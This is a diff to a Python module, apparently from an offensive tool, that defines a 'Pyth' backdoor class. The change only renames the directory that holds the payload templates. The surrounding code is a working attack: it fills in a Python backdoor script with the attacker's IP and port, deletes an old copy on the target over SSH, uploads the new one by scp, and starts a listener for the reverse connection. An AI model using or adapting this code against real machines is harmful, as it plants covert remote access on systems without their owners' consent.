@@ -20,23 +20,23 @@ class Pyth(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
-        toW = 'backdoors/shell/pythScript/pythBackdoor.py'
+        toW = 'backdoors/shell/__pythScript/pythBackdoor.py'
         stringToAdd = ""
         fileToWrite = open(toW, 'w')
 
-        with open ("backdoors/shell/pythScript/pythPart1", "r") as myfile:
+        with open ("backdoors/shell/__pythScript/pythPart1", "r") as myfile:
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
         stringToAdd+=data + self.core.localIP + "\", " + str(self.get_value("port"))
 
-        with open ("backdoors/shell/pythScript/pythPart2", "r") as myfile:
+        with open ("backdoors/shell/__pythScript/pythPart2", "r") as myfile:
             data=myfile.read()
 
         stringToAdd+=data
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
         target.ssh.exec_command('rm pythBackdoor.py')
-        target.scpFiles(self, 'backdoors/shell/pythScript/pythBackdoor.py', False)
+        target.scpFiles(self, 'backdoors/shell/__pythScript/pythBackdoor.py', False)
         self.listen()
         
         print(GOOD + "Moving the backdoor script.")
